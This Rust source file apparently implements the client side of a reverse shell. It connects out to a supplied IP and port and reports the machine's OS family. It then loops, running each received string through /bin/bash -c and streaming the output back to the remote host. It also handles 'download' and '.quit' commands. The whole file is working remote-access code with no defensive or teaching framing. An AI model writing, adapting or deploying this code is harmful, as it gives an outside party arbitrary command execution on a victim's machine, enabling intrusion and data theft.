use std::error::Error;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{exit, Command};

use crate::utils::*;

pub fn client(i: &str, p: &str) -> Result<(), Box<dyn Error>> {
    let mut stream = TcpStream::connect(i.to_owned() + ":" + p)?;

    let os = std::env::consts::FAMILY;
    match stream.write_all(os.as_bytes()) {
        Ok(_) => (),
        Err(e) => {
            println!("Error sending OS info : {}", e);
            exit(1);
        }
    }

    loop {
        let mut buff = [0; 4096];
        let read = stream.read(&mut buff);
        let bytes_read = match read {
            Ok(b) => b,
            Err(r) => {
                println!("Reading error : {}", r);
                continue;
            }
        };

        let cmd = String::from_utf8_lossy(&buff[..bytes_read])
            .trim_end_matches('\0')
            .to_string();

        println!("CMD: {}", cmd);

        match handler(cmd, &mut stream) {
            HandlerStatus::Ok => (),
            HandlerStatus::FileError => println!("File error"),
            HandlerStatus::CmdError => println!("Command error"),
            HandlerStatus::EndSession => {
                println!("Ending session");
                break;
            }
            HandlerStatus::SendError => {
                println!("Error sending data");
                break;
            }
        }
        stream.flush()?;
    }

    Ok(())
}

fn handler(cmd: String, tls_stream: &mut TcpStream) -> HandlerStatus {
    if cmd.starts_with("download") {
        dl_cmd(&cmd, tls_stream)
    } else if cmd.starts_with(".quit") {
        HandlerStatus::EndSession
    } else {
        run_cmd(&cmd, tls_stream)
    }
}

fn run_cmd(cmd: &String, tls_stream: &mut TcpStream) -> HandlerStatus {
    let mut out = match run(cmd) {
        Some(o) => o,
        None => return HandlerStatus::CmdError,
    };

    if out.is_empty() {
        match tls_stream.write_all("\0".as_bytes()) {
            Ok(_) => HandlerStatus::Ok,
            Err(_) => HandlerStatus::SendError,
        }
    } else {
        let mut buff_to_send = [0; 4096];
        loop {
            let mut count = 0;
            for c in &out {
                if count == 4096 {
                    break;
                }
                buff_to_send[count] = *c;
                count += 1;
            }

            match tls_stream.write(&buff_to_send) {
                Ok(_) => (),
                Err(_) => return HandlerStatus::SendError,
            }

            buff_to_send = [0; 4096];
            if count < 4096 {
                break;
            }
            out = out.split_off(count);
        }
        HandlerStatus::Ok
    }
}

fn run(cmd: &String) -> Option<Vec<u8>> {
    let exec = match Command::new("/bin/bash")
        .args(["-c", cmd.trim_end_matches("\r\n")])
        .output()
    {
        Ok(e) => e,
        Err(_) => return None,
    };

    let stdo = exec.stdout.as_slice();
    let stderr = exec.stderr.as_slice();

    if stderr.is_empty() {
        Some(stdo.to_vec())
    } else {
        Some(stderr.to_vec())
    }
}
